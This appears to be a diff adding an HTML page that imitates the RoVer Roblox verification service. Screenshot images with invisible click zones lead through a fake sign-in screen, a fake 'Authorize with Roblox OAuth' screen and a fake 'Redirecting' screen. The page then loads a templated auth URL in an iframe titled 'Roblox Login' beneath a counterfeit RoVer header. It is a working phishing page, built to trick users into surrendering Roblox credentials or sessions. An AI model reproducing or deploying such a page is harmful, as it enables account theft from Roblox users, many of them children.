@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>RoVer</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body { background: #1c1c1c; width: 100%; min-height: 100%; }
+
+    .screen { display: none; flex-direction: column; align-items: center; }
+    .screen.active { display: flex; }
+
+    #s0, #s1 { opacity: 0; transition: opacity 0.3s ease; }
+    #s0.visible, #s1.visible { opacity: 1; }
+    #s2, #s3 { opacity: 1; }
+
+    .img-wrap { position: relative; width: 100%; max-width: 1600px; }
+    .img-wrap img { display: block; width: 100%; height: auto; filter: brightness(1.06) contrast(1.02); }
+
+    .zone { position: absolute; cursor: pointer; }
+
+    /* ── SCREEN 3: iframe wrapper ── */
+    #s3 {
+      flex-direction: column;
+      width: 100%;
+      height: 100vh;
+    }
+
+    .rover-bar {
+      background: #e91e8c;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 14px 24px;
+      flex-shrink: 0;
+      width: 100%;
+    }
+
+    .rover-bar .menu { font-size: 26px; color: white; }
+    .rover-bar .logo { display: flex; align-items: center; gap: 10px; font-size: 22px; font-weight: 700; color: white; font-family: 'Segoe UI', sans-serif; }
+    .rover-bar .logo svg { width: 28px; height: 28px; fill: white; }
+    .rover-bar .spacer { width: 26px; }
+
+    #rover-iframe {
+      flex: 1;
+      width: 100%;
+      border: none;
+      background: #1c1c1c;
+    }
+
+    /* ══ DESKTOP ══ */
+    #z0-login    { top: 60%; left: 50%; transform: translateX(-50%); width: 22%; height: 9%;  border-radius: 999px; }
+    #z1-continue { top: 73%; left: 50%; transform: translateX(-50%); width: 46%; height: 6%;  border-radius: 6px; }
+    #z1-return   { top: 83%; left: 50%; transform: translateX(-50%); width: 46%; height: 6%;  border-radius: 6px; }
+
+    /* ══ LAPTOP ══ */
+    @media (max-width: 1280px) and (orientation: landscape) {
+      #z0-login    { width: 22%; height: 9%; }
+      #z1-continue { top: 73%; width: 46%; height: 6%; }
+      #z1-return   { top: 83%; width: 46%; height: 6%; }
+    }
+
+    /* ══ TABLET LANDSCAPE ══ */
+    @media (max-width: 1024px) and (orientation: landscape) {
+      #z0-login    { width: 24%; height: 10%; }
+      #z1-continue { top: 73%; width: 50%; height: 7%; }
+      #z1-return   { top: 83%; width: 50%; height: 7%; }
+    }
+
+    /* ══ TABLET PORTRAIT ══ */
+    @media (max-width: 1024px) and (orientation: portrait) {
+      #z0-login    { width: 26%; height: 9%; }
+      #z1-continue { top: 73%; width: 50%; height: 7%; }
+      #z1-return   { top: 83%; width: 50%; height: 7%; }
+    }
+
+    /* ══ PHONE LANDSCAPE ══ */
+    @media (max-width: 900px) and (orientation: landscape) {
+      #z0-login    { width: 26%; height: 11%; }
+      #z1-continue { top: 73%; width: 52%; height: 9%; }
+      #z1-return   { top: 83%; width: 52%; height: 9%; }
+    }
+
+    /* ══ PHONE PORTRAIT ══ */
+    @media (max-width: 600px) and (orientation: portrait) {
+      #z0-login    { width: 32%; height: 9%; }
+      #z1-continue { top: 73%; width: 54%; height: 8%; }
+      #z1-return   { top: 83%; width: 54%; height: 8%; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- SCREEN 0: Sign in to RoVer -->
+  <div id="s0" class="screen active">
+    <div class="img-wrap">
+      <img src="/verify-page.png" alt="">
+      <div id="z0-login" class="zone" onclick="goTo('s1')"></div>
+    </div>
+    <div class="img-wrap"><img src="/footer-page.png" alt=""></div>
+  </div>
+
+  <!-- SCREEN 1: Authorize with Roblox OAuth -->
+  <div id="s1" class="screen">
+    <div class="img-wrap">
+      <img src="/oauth-page.png" alt="">
+      <div id="z1-continue" class="zone" onclick="startRedirect()"></div>
+      <div id="z1-return"   class="zone" onclick="goTo('s0')"></div>
+    </div>
+    <div class="img-wrap"><img src="/footer-page.png" alt=""></div>
+  </div>
+
+  <!-- SCREEN 2: Redirecting (instant, 1 second then shows iframe) -->
+  <div id="s2" class="screen">
+    <div class="img-wrap"><img src="/redirect-page.png" alt=""></div>
+    <div class="img-wrap"><img src="/footer-page.png" alt=""></div>
+  </div>
+
+  <!-- SCREEN 3: Roblox site inside RoVer -->
+  <div id="s3" class="screen">
+    <div class="rover-bar">
+      <span class="menu">&#9776;</span>
+      <div class="logo">
+        <svg viewBox="0 0 100 100"><rect x="10" y="10" width="35" height="35" rx="4"/><rect x="55" y="10" width="35" height="35" rx="4"/><rect x="10" y="55" width="35" height="35" rx="4"/><rect x="55" y="55" width="35" height="35" rx="4"/></svg>
+        RoVer
+      </div>
+      <span class="spacer"></span>
+    </div>
+    <iframe id="rover-iframe" src="" title="Roblox Login"></iframe>
+  </div>
+
+  <script>
+    const FINAL_URL = '{{AUTH_URL}}';
+
+    function goTo(id) {
+      const current = document.querySelector('.screen.active');
+      if (current && (current.id === 's0' || current.id === 's1')) {
+        current.classList.remove('visible');
+        setTimeout(() => {
+          current.classList.remove('active');
+          const next = document.getElementById(id);
+          next.classList.add('active');
+          window.scrollTo(0, 0);
+          requestAnimationFrame(() => requestAnimationFrame(() => next.classList.add('visible')));
+        }, 300);
+      } else {
+        if (current) current.classList.remove('active');
+        const next = document.getElementById(id);
+        next.classList.add('active');
+        window.scrollTo(0, 0);
+        if (next.id === 's0' || next.id === 's1') {
+          requestAnimationFrame(() => requestAnimationFrame(() => next.classList.add('visible')));
+        }
+      }
+    }
+
+    function startRedirect() {
+      const current = document.querySelector('.screen.active');
+      if (current) { current.classList.remove('visible'); current.classList.remove('active'); }
+      document.getElementById('s2').classList.add('active');
+      window.scrollTo(0, 0);
+      setTimeout(() => {
+        document.getElementById('s2').classList.remove('active');
+        document.getElementById('rover-iframe').src = FINAL_URL;
+        document.getElementById('s3').classList.add('active');
+        window.scrollTo(0, 0);
+      }, 1000);
+    }
+
+    window.addEventListener('load', () => {
+      requestAnimationFrame(() => requestAnimationFrame(() => {
+        document.getElementById('s0').classList.add('visible');
+      }));
+    });
+  </script>
+
+</body>
+</html>
